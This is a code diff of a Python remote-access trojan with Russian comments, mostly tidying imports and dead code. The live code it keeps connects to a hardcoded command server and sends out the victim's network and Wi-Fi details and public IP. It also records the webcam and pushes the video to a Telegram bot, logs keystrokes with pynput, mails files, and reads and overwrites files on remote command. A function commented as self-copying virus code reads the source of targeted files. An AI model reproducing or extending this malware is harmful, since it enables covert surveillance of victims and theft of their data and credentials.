@@ -1,30 +1,25 @@
+import os, time
 import datetime
-import os, stat, time
-
+from pynput.keyboard import Listener
+from pynput import keyboard
+import os, stat, shutil
 import keyboard
-from pywifi import *
-import threading
-
-import mimetypes  # Импорт класса для обработки неизвестных MIME-типов, базирующихся на расширении файла
-import subprocess
-
 import smtplib  # Импортируем библиотеку по работе с SMTP
-import socket, cv2
 from email.mime.audio import MIMEAudio  # Аудио
 from email.mime.image import MIMEImage  # Изображения
 from email.mime.multipart import MIMEMultipart  # Многокомпонентный объект
 from email.mime.text import MIMEText  # Текст/HTML
 
-#from tkinter import Tk, Entry, Label
+
 import socket, subprocess, mimetypes, requests
 from pywifi import *
 from requests import get
-from random import randint as ri
+
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 host = socket.getaddrinfo(socket.gethostname(), None)
 ipv4_addresses = [i[4][0] for i in host if i[0] == socket.AF_INET]
 #print(ipv4_addresses)
-ip = "192.168.0.12" #  server ip
+ip = "192.168.0.12"
 reconect = False
 
 
@@ -62,7 +57,6 @@ def prepare():
     data1 = (subprocess.check_output(["ipconfig", "/all"]).decode("cp866")).split('\n')
     data = []
     dAta = []
-    import pywifi
     wifi = PyWiFi()
     ifaces = wifi.interfaces()[0]
     interfaces = ifaces.name()
@@ -85,7 +79,6 @@ global perm_dt
 perm_dt = 1
 
 def waiting(ip="192.168.0.12", s=None):
-    import datetime
     global end_dt
     global perm_dt
 
@@ -105,8 +98,6 @@ def waiting(ip="192.168.0.12", s=None):
 
 def show_ip(lp=None, public_ip=None):
     try:
-        import requests, socket
-        from requests import get
         geo = []
         geo.append(public_ip + " - public ip\n" + lp + " - local ip")
 
@@ -135,13 +126,11 @@ def show_ip(lp=None, public_ip=None):
         s.send("Check wireless connection".encode("utf-8"))
         return
     except Exception as e:
-        s.send(e.encode("utf-8"))
+        s.send(str(e).encode("utf-8"))
         return e
 
 
 def ti(dt_pr, dt_now):
-    import datetime
-
     date = (str(dt_now).split(" "))[0] + '---' + (str(dt_pr).split(" "))[0]
     if dt_now == 0:
         tm = "0:0:0"
@@ -192,8 +181,9 @@ def video(tm, timer):
     #cv2.destroyAllWindows()
     out.release()
     return tm + ".avi"
+
+
 def kboard(com):
-    import keyboard
     def writeing_to_the_keyboard(text):
         keyboard.write(text)
     def hotk(key, text):
@@ -255,7 +245,7 @@ def send_video(path='output.avi'):
         #print("ok")
         bot.stop_polling()
 
-    bot.send_video(1251720329, video=open(path, 'rb'), supports_streaming=True)
+    bot.send_video(0, video=open(path, 'rb'), supports_streaming=True)  # first parameter is your telegram id
     stop_command()
     #bot.polling(none_stop=False, interval=0)
 
@@ -319,7 +309,6 @@ def wlk(dir, main_path):
 
 
 def py_to_exe(file):
-    import os, stat, subprocess, shutil
     """with open(file + ".py", "w") as tr:
         tr.write()"""
     os.system("pip install pyinstaller")
@@ -340,9 +329,7 @@ def py_to_exe(file):
     os.chdir("dist")
 
 def keylog():
-    from pynput.keyboard import Key, Listener
-    import logging
-    from pynput import keyboard
+
     logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format="%(message)s")
 
     def on_press(key):
@@ -374,6 +361,7 @@ def walk(msg, dir):  # парсер директорий
         else:  # если папка, ...
             walk(msg, path3)  # ... заходим в неё и повторяем
 
+
 def virus(python):  # основная функция самокопирования
     file = open(python, "r")  # снова читаем атакуемый файл
     original_code = ""  # вводим переменную для исходного кода атакуемого файла
@@ -381,6 +369,8 @@ def virus(python):  # основная функция самокопирован
         original_code += line  # построчно вводим код в переменную
     #file.close()
     return original_code
+
+
 def send_email(addr_to, f1le, msg_subj="Test", msg_text="hello"):
     msg = MIMEMultipart()
     addr_from = ""                      # Отправитель
@@ -448,12 +438,7 @@ def read_file(python):
     #print(original_code)
         file.close()
     return original_code
-def on_closing():
-    print()
-    #root.attributes("-fullscreen", True)  # включаем полноэкранный режим
-    #root.protocol("WM_DELETE_WINDOW", on_closing)  # при попытке закрыть окно с помощью диспетчера окон вызываем функцию
-    #root.update()  # постоянное обновление окна
-    #root.bind('<Control-KeyPress-c>', callback)  # вводим сочетание клавиш, которые будут закрывать программу
+
 
 s.send((subprocess.getoutput("cd")).encode())
 print(s.recv(1024).decode())
@@ -465,10 +450,6 @@ while 1:
             s.send((subprocess.getoutput("cd")).encode())
             print(s.recv(1024).decode())
             reconect = False
-        """root = Tk()  # создаём окно
-        pyautogui.FAILSAFE = False  # выключаем защиту "левого верхнего угла"
-        root.protocol("WM_DELETE_WINDOW", on_closing)  # при попытке закрыть окно с помощью диспетчера окон вызываем функцию
-        """
         command = s.recv(4096 * 1024).decode("utf-8")
         if "py_to_exe" in command.split(":")[0]:
             try:
@@ -529,9 +510,6 @@ while 1:
             file = open(name, "r")
             s.send((file.read()).encode("utf-8"))
             file.close()
-            #s.send("Start writing... \n".encode())
-            """while s.recv(4096 * 1024).decode() != "abberation":
-                isp += s.recv(4096 * 1024).decode()"""
             isp = s.recv(4096 * 1024).decode("utf-8")
             with open(name, "w") as fl:
                 fl.write(isp); fl.close()
